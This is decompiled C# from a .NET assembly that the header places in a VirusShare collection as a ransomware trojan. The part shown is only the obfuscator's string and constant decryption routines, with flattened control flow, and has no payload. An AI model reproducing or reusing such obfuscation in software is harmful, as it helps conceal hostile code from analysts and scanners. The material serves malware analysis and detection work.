// Decompiled with JetBrains decompiler
// Type: ��?��0B�2��Hg�0
// Assembly: mtrl, Version=5.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D340C4D9-77FF-49DB-A007-50B4002F5AFA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.Win32.Generic-429a36b53420915e57e9034d24b9ce0668b08c5e0e1d3eca43c67980b9dd2198.exe

using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

internal static class \uFFFD\uFFFD\u003F\uFFFD\u0007\uFFFD0B\uFFFD2\uFFFD\uFFFDHg\uFFFD0
{
  static object Kw\uFFFDޢz\uFFFD\uFFFD\uFFFD\u0028QYN\uFFFD\uFFFD\u0024(uint a, uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    uint num1 = (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
    int num2 = -(--7 - 20) + 8;
    Stream 㬓儴ᴟ嚟矶殷ﮊ;
    uint num3;
    object obj;
    while (true)
    {
      uint num4;
      uint num5;
      uint num6;
      uint num7;
      uint num8;
      int num9;
      do
      {
        switch (num2)
        {
          case 1:
            if (num6 <= 64U)
              goto case 6;
            else
              goto label_31;
          case 2:
            num6 = 1U;
            num2 = -(-(9 + ~4) + 3);
            continue;
          case 3:
            if (num7 >= 16U && num7 < 32U)
            {
              num4 ^= (uint) (((int) num5 & 16711935) << 8 ^ ((int) ((num5 & 16776960U) >> 8) | ~(int) num5 & (int) ushort.MaxValue));
              num2 = ~---19;
              continue;
            }
            num9 = (int) num7;
            num2 = -2 + (9 - 2) - 0;
            continue;
          case 4:
            int num10 = (int) num7;
            num2 = -(5 + -(7 + 6) - ~4);
            if ((uint) num10 >= 0U)
            {
              num2 = ~-10 - (2 - 6);
              continue;
            }
            continue;
          case 5:
            int num11 = (int) num7;
            num2 = ~~11 + 9;
            if ((uint) num11 >= 48U)
            {
              num2 = -5 + -7 - -20 + (7 - 5);
              continue;
            }
            continue;
          case 6:
            num5 = (uint) (((int) num5 & 16777215) << 8) | (num5 & 4278190080U) >> 24;
            num2 = 21 - 2;
            continue;
          case 7:
            num5 ^= num4 % num8 | 973463972U;
            num2 = -(~14 - (9 - 4));
            continue;
          case 8:
            Monitor.Enter((object) (㬓儴ᴟ嚟矶殷ﮊ = \u003CModule\u003E.\u23FC㬓儴ᴟ嚟矶殷ﮊ));
            goto label_33;
          case 9:
            int num12 = (int) num7;
            num2 = 4 - (8 + ~4 - 9) - 5;
            if ((uint) num12 < 48U)
            {
              num2 = ~(8 + (-4 - (9 - 9))) + 5;
              continue;
            }
            continue;
          case 10:
            int num13 = (int) num7;
            num2 = -(2 + 4 - (7 - 4 - (9 - 2) - -30));
            if ((uint) num13 < 64U)
            {
              num2 = ~(-17 - --3 - -2);
              continue;
            }
            continue;
          case 11:
            num4 = 1908178548U;
            num8 = 802591994U;
            num2 = -8 - ~2 + 7;
            continue;
          case 12:
            if (!\u003CModule\u003E.ꞕ\uF303柳䠼뗊谡彐Ʋ.TryGetValue(num3, out obj))
            {
              num2 = ~~~-9;
              continue;
            }
            goto label_57;
          case 13:
            if (num7 < 16U)
            {
              num4 |= (uint) ((int) ((num5 & 65280U) >> 8) & (int) ((num5 & 16711680U) >> 16) ^ ~(int) num5 & (int) byte.MaxValue);
              num8 ^= (uint) ((int) num5 * (int) num6 + 1) % 16U;
              num5 += (uint) (((int) num4 | (int) num8) ^ 973463972);
              num2 = 22 - (~3 + (3 + 3));
              continue;
            }
            goto case 3;
          case 14:
          case 20:
            ++num6;
            goto case 1;
          case 15:
            goto label_24;
          case 16:
            goto label_25;
          case 17:
            goto label_26;
          case 18:
            goto label_27;
          case 19:
            goto label_28;
          case 21:
            goto label_32;
          default:
            num4 += (uint) (((int) num5 & (int) byte.MaxValue | (int) ((num5 & 16711680U) >> 16)) + (~(int) num5 & (int) byte.MaxValue));
            num2 = ~~~-17;
            continue;
        }
      }
      while ((uint) num9 < 32U);
      num2 = 7 - (-(6 + 5) - -9 - (4 - 4));
      continue;
label_24:
      num5 |= (uint) ((int) num4 + ~(int) num8 & 973463972);
      num2 = ~(4 - 16) + 3;
      continue;
label_25:
      num8 -= (uint) ~((int) num5 + (int) num7) % 48U;
      num2 = -~(15 - 9);
      continue;
label_26:
      num4 ^= (uint) (((int) ((num5 & 16711680U) >> 16) | ~((int) num5 & (int) byte.MaxValue)) * (~(int) num5 & 16711680));
      num8 += (num5 ^ num6 - 1U) % num7;
      num5 -= (uint) (~((int) num4 ^ (int) num8) + 973463972);
      num2 = 2 + ~7 - -26;
      continue;
label_27:
      num8 += num5 * num6 % 32U;
      num2 = -~~-15;
      continue;
label_28:
      num7 = (num5 & (uint) byte.MaxValue) % 64U;
      num2 = --13 - 9;
      continue;
label_31:
      num3 = num5 ^ b;
      num2 = ~~--12;
      continue;
label_32:
      num5 = 774218718U ^ num1;
      num2 = ~(-17 - -5);
    }
label_33:
    byte num14;
    byte[] bytes;
    try
    {
      BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.\u23FC㬓儴ᴟ嚟矶殷ﮊ);
      binaryReader.BaseStream.Seek((long) num3, SeekOrigin.Begin);
      num14 = binaryReader.ReadByte();
      bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
      switch (2 - --2)
      {
      }
    }
    finally
    {
      Monitor.Exit((object) 㬓儴ᴟ嚟矶殷ﮊ);
    }
    byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876221 ^ currentMethod.MetadataToken);
    int num15 = --(~-8 - 3);
    while (true)
    {
      int num16;
      do
      {
        int index;
        uint num17;
        ushort num18;
        ushort num19;
        ushort num20;
        ushort num21;
        int num22;
        do
        {
          switch (num15)
          {
            case 1:
              num15 = -(-27 - -(9 - 5)) - 8;
              continue;
            case 2:
              obj = (object) BitConverter.ToDouble(bytes, 0);
              num15 = -~--14;
              continue;
            case 3:
              ++index;
              num15 = ~~~-6;
              continue;
            case 4:
              num17 = (uint) (((int) num3 + (int) num14) * 1152257809);
              num20 = (ushort) (num17 >> 16);
              num15 = 9 - (~7 - ~6);
              continue;
            case 5:
              if (index >= bytes.Length)
              {
                num22 = (int) num14;
                num15 = ~(~17 + (3 + 3));
                continue;
              }
              break;
            case 6:
              goto label_45;
            case 7:
              goto label_48;
            case 8:
              goto label_49;
            case 9:
              goto label_50;
            case 10:
              goto label_52;
            case 11:
              goto label_53;
            case 12:
              goto label_55;
            case 13:
              goto label_56;
            case 14:
              goto label_57;
            case 15:
              goto label_58;
            case 16:
              goto label_59;
          }
          bytes[index] ^= (byte) ((num17 * (uint) num18 + (uint) num19) % 256U ^ (uint) numArray[index % 8]);
          num18 = (ushort) ((num17 * (uint) num18 + (uint) num20) % 65536U);
          num19 = (ushort) ((num17 * (uint) num19 + (uint) num21) % 65536U);
          num15 = -4 - (~6 + (9 - 9));
        }
        while (num22 != 247);
        num15 = ~6 - (-14 - (7 - 4 + ~7));
        continue;
label_45:
        obj = (object) BitConverter.ToSingle(bytes, 0);
        goto label_58;
label_48:
        num15 = 18 - -~3 - (5 + 4);
        continue;
label_49:
        index = 0;
        num15 = -(-10 - ~2);
        continue;
label_50:
        if (num14 == (byte) 4)
        {
          obj = (object) BitConverter.ToInt64(bytes, 0);
          num15 = --21 - 9;
          continue;
        }
        goto label_59;
label_52:
        num21 = (ushort) (num17 & (uint) ushort.MaxValue);
        num18 = num21;
        num19 = num20;
        num15 = ~(7 - --16);
        continue;
label_53:
        if (num14 != (byte) 99)
        {
          if (num14 == (byte) 40)
          {
            obj = (object) BitConverter.ToInt32(bytes, 0);
            num15 = ~-~-3;
            continue;
          }
          goto label_50;
        }
        else
        {
          num15 = 3 - 2 + ~9 - -9 + (4 + 2);
          continue;
        }
label_55:
        num15 = --17 - -4 - 6;
        continue;
label_56:
        obj = (object) Encoding.UTF8.GetString(bytes);
        num15 = -(-9 + ~5);
        continue;
label_58:
        \u003CModule\u003E.ꞕ\uF303柳䠼뗊谡彐Ʋ[num3] = obj;
        num15 = ~-11 + ~4 + 9;
        continue;
label_59:
        num16 = (int) num14;
        num15 = ~~~-16;
      }
      while (num16 != 95);
      num15 = ~(-4 - (3 + 7));
    }
label_57:
    return obj;
  }

  static object \uFFFD\uFFFD\u005B\u005D\uFFFD\u001D\uFFFD\u0DF7\uFFFD\uFFFD\u0015\uFFFD\uFFFD\uFFFD(
    uint a,
    uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    uint num1 = (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
    int num2 = ~(-34 - (-8 - (6 + 9))) + 3;
    uint num3;
    object obj;
    while (true)
    {
      uint num4;
      uint num5;
      uint num6;
      uint num7;
      uint num8;
      int num9;
      do
      {
        int num10;
        do
        {
          switch (num2)
          {
            case 1:
            case 14:
            case 19:
              goto label_30;
            case 2:
              goto label_6;
            case 3:
label_8:
              if (num4 < 32U)
                break;
              goto label_9;
            case 4:
              num5 = (uint) (((int) num5 & 16777215) << 8) | (num5 & 4278190080U) >> 24;
              num4 = (num5 & (uint) byte.MaxValue) % 64U;
              if (num4 < 0U)
                goto label_22;
              else
                goto label_11;
            case 5:
              goto label_12;
            case 6:
              if (num4 >= 48U)
                break;
              goto label_14;
            case 7:
              goto label_15;
            case 8:
              goto label_16;
            case 9:
              goto label_17;
            case 10:
              goto label_18;
            case 11:
              goto label_19;
            case 12:
              goto label_20;
            case 13:
              goto label_21;
            case 15:
              goto label_24;
            case 16:
              goto label_25;
            case 17:
              goto label_26;
            case 18:
              goto label_28;
            case 20:
              goto label_31;
            case 21:
              goto label_32;
            case 22:
              goto label_33;
            default:
              if (num4 < 16U)
              {
                num2 = ~(-8 - (~3 - -9)) - 7;
                continue;
              }
              goto label_22;
          }
          num10 = (int) num4;
          num2 = -~~-19;
          continue;
label_22:
          if (num4 < 16U || num4 >= 32U)
            goto label_8;
          else
            goto label_23;
        }
        while ((uint) num10 < 48U);
        num2 = ~-(12 - -(3 + 3));
        continue;
label_6:
        if (!\u003CModule\u003E.ꞕ\uF303柳䠼뗊谡彐Ʋ.TryGetValue(num3, out obj))
        {
          num2 = ~-(31 - --9);
          continue;
        }
        goto label_53;
label_9:
        num2 = -(-6 - 5 - -5);
        continue;
label_11:
        num2 = -(-7 - ~6);
        continue;
label_12:
        num6 |= (uint) ((int) ((num5 & 65280U) >> 8) & (int) ((num5 & 16711680U) >> 16) ^ ~(int) num5 & (int) byte.MaxValue);
        num2 = --24 - 8;
        continue;
label_14:
        num6 += (uint) (((int) num5 & (int) byte.MaxValue | (int) ((num5 & 16711680U) >> 16)) + (~(int) num5 & (int) byte.MaxValue));
        num2 = ~(-7 - (2 - ~(3 + 8)));
        continue;
label_15:
        num2 = ~-(17 + ~~3);
        continue;
label_16:
        num2 = -5 - (-38 - ~(9 + 5));
        continue;
label_17:
        num7 = 2077824851U;
        num2 = ~(~7 - 3);
        continue;
label_18:
        num8 = 1U;
        num2 = --8 - (9 - 2) + 7;
        continue;
label_19:
        num3 = num5 ^ b;
        num2 = ~~(~~9 - 7);
        continue;
label_20:
        num7 += (num5 ^ num8 - 1U) % num4;
        num5 -= (uint) (~((int) num6 ^ (int) num7) + 1212918635);
        num2 = ~3 - (5 - 8) - -20;
        continue;
label_21:
        num5 = 1195436348U ^ num1;
        num6 = 291458781U;
        num2 = 7 - ---2;
        continue;
label_23:
        num6 ^= (uint) (((int) num5 & 16711935) << 8 ^ ((int) ((num5 & 16776960U) >> 8) | ~(int) num5 & (int) ushort.MaxValue));
        num7 += num5 * num8 % 32U;
        num5 |= (uint) ((int) num6 + ~(int) num7 & 1212918635);
        num2 = -(~6 - (9 - 9));
        continue;
label_24:
        num5 ^= num6 % num7 | 1212918635U;
        num2 = -12 - ~(7 - 2) - -7;
        continue;
label_25:
        num7 ^= (uint) ((int) num5 * (int) num8 + 1) % 16U;
        num2 = -(-7 - --8 + ~6);
        continue;
label_26:
        if (num4 < 64U)
        {
          num6 ^= (uint) (((int) ((num5 & 16711680U) >> 16) | ~((int) num5 & (int) byte.MaxValue)) * (~(int) num5 & 16711680));
          num2 = 7 - ~(~(5 + 8) - -18);
          continue;
        }
        goto label_30;
label_28:
        num9 = (int) num8;
        num2 = ~(4 - 7) + 2;
      }
      while ((uint) num9 <= 64U);
      num2 = ~-8 + (3 + 4) - 3;
      continue;
label_30:
      ++num8;
      num2 = ~-24 - 5;
      continue;
label_31:
      num7 -= (uint) ~((int) num5 + (int) num4) % 48U;
      num2 = -~~-15;
      continue;
label_33:
      num5 += (uint) (((int) num6 | (int) num7) ^ 1212918635);
      num2 = -~19 - 6;
    }
label_32:
    byte num11;
    byte[] bytes;
    lock (\u003CModule\u003E.\u23FC㬓儴ᴟ嚟矶殷ﮊ)
    {
      BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.\u23FC㬓儴ᴟ嚟矶殷ﮊ);
      binaryReader.BaseStream.Seek((long) num3, SeekOrigin.Begin);
      switch (-(--8 + -8))
      {
        default:
          num11 = binaryReader.ReadByte();
          bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
          break;
      }
    }
    byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876220 ^ currentMethod.MetadataToken);
    int num12 = --19 - 5;
    while (true)
    {
      uint num13;
      ushort num14;
      ushort num15;
      ushort num16;
      int index;
      int num17;
      do
      {
        int num18;
        do
        {
          switch (num12)
          {
            case 1:
              if (index >= bytes.Length)
              {
                num18 = (int) num11;
                num12 = 4 - ~--3;
                continue;
              }
              goto label_57;
            case 2:
              goto label_43;
            case 3:
            case 11:
              goto label_56;
            case 4:
              goto label_46;
            case 5:
              goto label_47;
            case 6:
              goto label_49;
            case 7:
              goto label_50;
            case 8:
              goto label_51;
            case 9:
              goto label_53;
            case 10:
              goto label_54;
            case 12:
              goto label_57;
            case 13:
              goto label_58;
            case 14:
              goto label_59;
            case 15:
              goto label_60;
            default:
              num14 = (ushort) (num13 >> 16);
              num15 = (ushort) (num13 & (uint) ushort.MaxValue);
              num16 = num15;
              num12 = ~~(-8 - ~(5 + 9));
              continue;
          }
        }
        while (num18 != 247);
        num12 = 4 - -~-10;
        continue;
label_43:
        ++index;
        num12 = --(9 - -~7);
        continue;
label_47:
        if (num11 != (byte) 4)
        {
          num17 = (int) num11;
          num12 = ~~8 - 2 + (3 - 6) + 8;
          continue;
        }
        goto label_48;
label_51:
        if (num11 == (byte) 99)
          goto label_52;
label_54:
        if (num11 != (byte) 40)
          goto label_47;
        else
          goto label_55;
      }
      while (num17 != 95);
      num12 = 9 - (-(9 - 4) - -8);
      continue;
label_46:
      num12 = -(-(2 + 7) - -10 + (7 - 9));
      continue;
label_48:
      obj = (object) BitConverter.ToInt64(bytes, 0);
      num12 = ~~--3;
      continue;
label_49:
      obj = (object) Encoding.UTF8.GetString(bytes);
      num12 = ~-~-13;
      continue;
label_50:
      ushort num19 = num14;
      index = 0;
      num12 = ~(4 - 6) + 3;
      continue;
label_52:
      obj = (object) BitConverter.ToSingle(bytes, 0);
      num12 = ~(5 + 5 - ~-23);
      continue;
label_55:
      obj = (object) BitConverter.ToInt32(bytes, 0);
      num12 = -(~(4 - 7) - 18) - 5;
      continue;
label_56:
      \u003CModule\u003E.ꞕ\uF303柳䠼뗊谡彐Ʋ[num3] = obj;
      num12 = 27 - ~~4 - (6 + 6) - 2;
      continue;
label_57:
      bytes[index] ^= (byte) ((num13 * (uint) num16 + (uint) num19) % 256U ^ (uint) numArray[index % 8]);
      num16 = (ushort) ((num13 * (uint) num16 + (uint) num14) % 65536U);
      num19 = (ushort) ((num13 * (uint) num19 + (uint) num15) % 65536U);
      num12 = --9 - 4 - 3;
      continue;
label_58:
      obj = (object) BitConverter.ToDouble(bytes, 0);
      num12 = -(-11 - (7 - (5 - 9))) - 7;
      continue;
label_59:
      num13 = (uint) (((int) num3 + (int) num11) * 1152257809);
      num12 = ~---1;
      continue;
label_60:
      num12 = ~(-4 - 8);
    }
label_53:
    return obj;
  }
}
